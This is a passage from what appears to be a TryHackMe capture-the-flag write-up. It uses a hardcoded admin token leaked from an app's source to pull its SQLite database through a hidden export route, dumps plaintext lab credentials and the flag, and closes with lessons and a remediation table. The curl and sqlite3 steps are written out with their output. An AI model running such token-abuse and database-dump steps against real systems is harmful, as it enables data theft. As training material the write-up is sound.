The chain is now obvious: the blocklist stops us from reading the DB file through traversal, but the app itself offers a legitimate download of that same file to anyone holding the admin token — and the token is sitting right there in the code.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 9. Exfiltrating the Database with the Leaked Admin Key

We bypass the blocklist entirely by calling the admin export route and attaching the custom header carrying the stolen key. curl adds any header with the `-H` option.

**Command:**

`curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://10.48.175.125:5000/api/admin/export_db" --output valenfind_leak.db`

**Breakdown:**

- `-H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO"`
    - Description: Adds a custom HTTP request header (`-H` stands for "header"); the value is the admin key lifted from the source.
    - Purpose: To satisfy the `if auth_header == ADMIN_API_KEY` check so the route hands us the database.
- `/api/admin/export_db`
    - Description: The hidden admin route that returns the database file when the token matches.
    - Purpose: The legitimate download path that bypasses the `.db` blocklist.
- `--output valenfind_leak.db`
    - Description: Saves the response to a local file named `valenfind_leak.db`.
    - Purpose: The response is binary database data, not text, so it is written to disk rather than printed.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://10.49.188.115:5000/api/admin/export_db" --output valenfind_leak.db
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  16384 100  16384   0      0  18703      0                              0

┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ ls
app.py  valenfind_leak.db
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 10. Opening the Database

The remaining steps run locally on the attacking machine (Kali), against the downloaded file — nothing further is sent to the target.

First we confirm the download really is a database, then list its tables. The file is a **SQLite** database — a self-contained database stored as a single file, read with the `sqlite3` command-line client that ships with Kali.

**Command:** `file valenfind_leak.db`

**Breakdown:**

- `file`
    - Description: A utility that inspects a file's contents and reports what type it is, regardless of its name.
    - Purpose: To confirm our download is a valid SQLite database and not an error page.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ file valenfind_leak.db                                                                         
valenfind_leak.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 4, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 4
```

**Command:** `sqlite3 valenfind_leak.db ".tables"`

**Breakdown:**

- `sqlite3 valenfind_leak.db`
    - Description: Opens the SQLite database file with the command-line client.
    - Purpose: To interact with the database contents.
- `.tables`
    - Description: A built-in SQLite meta-command that lists all tables in the database.
    - Purpose: To learn what data is stored; we expect a `users` table from the source code.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ sqlite3 valenfind_leak.db ".tables"
users
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 11. Reading the Stolen Credentials

**Command:**

`sqlite3 valenfind_leak.db "SELECT * FROM users;"`

**Breakdown:**

- `SELECT *` → `*` means "every column"
- `FROM users` → the table to read
- The `;` ends the SQL statement

By default the output is cramped and pipe-separated so to make readable use:

`sqlite3 -line valenfind_leak.db "SELECT * FROM users;"`

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
└─$ sqlite3 -line valenfind_leak.db "SELECT * FROM USERS"                   
          id = 1
    username = romeo_montague
    password = juliet123
   real_name = Romeo Montague
       email = romeo@verona.cupid
phone_number = 555-0100-ROMEO
     address = 123 Balcony Way, Verona, VR 99999
         bio = Looking for my Juliet. Where art thou?
       likes = 14
avatar_image = romeo.jpg

          id = 2
    username = casanova_official
    password = secret123
   real_name = Giacomo Casanova
       email = loverboy@venice.kiss
phone_number = 555-0155-LOVE
     address = 101 Grand Canal St, Venice, Italy
         bio = Just here for the free chocolate.
       likes = 5
avatar_image = casanova.jpg

          id = 3
    username = cleopatra_queen
    password = caesar_salad
   real_name = Cleopatra VII Philopator
       email = queen@nile.river
phone_number = 555-0001-NILE
     address = Royal Palace, Alexandria, Egypt
         bio = I rule an empire, but I can't rule my heart. 🐍
       likes = 88
avatar_image = cleo.jpg

          id = 4
    username = sherlock_h
    password = watson_is_cool
   real_name = Sherlock Holmes
       email = detective@baker.street
phone_number = 555-221B-KEYS
     address = 221B Baker Street, London, UK
         bio = Observant, logical, and looking for a mystery to solve (or a date).
       likes = 21
avatar_image = sherlock.jpg

          id = 5
    username = gatsby_great
    password = green_light
   real_name = Jay Gatsby
       email = jay@westegg.party
phone_number = 555-1922-RICH
     address = Gatsby Mansion, West Egg, NY, USA
         bio = Throwing parties every weekend hoping you'll walk through the door.
       likes = 105
avatar_image = gatsby.jpg

          id = 6
    username = jane_eyre
    password = rochester_blind
   real_name = Jane Eyre
       email = jane@thornfield.book
phone_number = 555-1847-READ
     address = Thornfield Hall, Yorkshire, UK
         bio = Quiet, independent, and looking for a connection of the soul.
       likes = 33
avatar_image = jane.jpg

          id = 7
    username = count_dracula
    password = sunlight_sucks
   real_name = Vlad Dracula
       email = vlad@night.walker
phone_number = 555-0666-BITE
     address = Bran Castle, Transylvania, Romania
         bio = I love long walks at night and biting... necks? No, biting into life!
       likes = 666
avatar_image = dracula.jpg

          id = 8
    username = cupid
    password = admin_root_x99
   real_name = System Administrator
       email = cupid@internal.cupid
phone_number = 555-0000-ROOT
     address = FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
         bio = I keep the database secure. No peeking.
       likes = 999
avatar_image = cupid.jpg

          id = 9
    username = ned
    password = moeca
   real_name = ned moeca
       email = nedmoeca@box.com
phone_number = 911
     address = The White House
         bio = Just got some new dontires!
       likes = 0
avatar_image = default.jpg
```

**The part that matters:**

```shell
          id = 8
    username = cupid
    password = admin_root_x99
   real_name = System Administrator
       email = cupid@internal.cupid
phone_number = 555-0000-ROOT
     address = FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
         bio = I keep the database secure. No peeking.
       likes = 999
avatar_image = cupid.jpg
```

The flag was hidden in the `address` field of the `cupid` administrator account:

==FLAG==: `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

The flag's wording — _"vibe coding is not my cup of tea"_ — is a direct nod to the challenge card's joke about the "vibe-coded" app. Fittingly, the admin's `bio` reads _"I keep the database secure. No peeking."_ — which we have just thoroughly disproven.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Lessons

The developer _did_ try to defend the database — the `fetch_layout` blocklist specifically refuses `cupid.db` and `.db` files. But security applied in one spot, while leaving hardcoded keys, a practically-unauthenticated export route, plaintext passwords, and an unrestricted file-read elsewhere, means the whole chain still collapses. Defences have to hold **everywhere**, not just at the one door the developer happened to think about.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>

<div style="page-break-after: always;"></div>

## Remediation

| Vulnerability                                   | Fix                                                                                                                                                                                                                                               |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Path Traversal in `/api/fetch_layout`           | Never pass user input to a file path. Map the theme choice to a fixed allow-list of filenames (e.g. a dictionary), and reject anything not on it. Additionally, canonicalise the resolved path and verify it stays inside the intended directory. |
| Hardcoded admin key                             | Remove secrets from source. Load them from environment variables or a secrets manager, and rotate any key that has ever been committed.                                                                                                           |
| Broken access control on `/api/admin/export_db` | Protect admin routes with real authenticated sessions and role checks, not a static shared token. Rate-limit and log access.                                                                                                                      |
| Plaintext password storage                      | Store only salted password hashes using a strong algorithm (e.g. bcrypt/argon2), and compare hashes at login.                                                                                                                                     |
| Blocklist-based filtering                       | Prefer allow-lists over blocklists. Blocklists fail the moment an attacker finds a path the author didn't anticipate.                                                                                                                             |
| Sensitive data exposure                         | Do not place secrets (or flags) in user-record fields; enforce least-privilege on what each endpoint can return.                                                                                                                                  |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>


## References

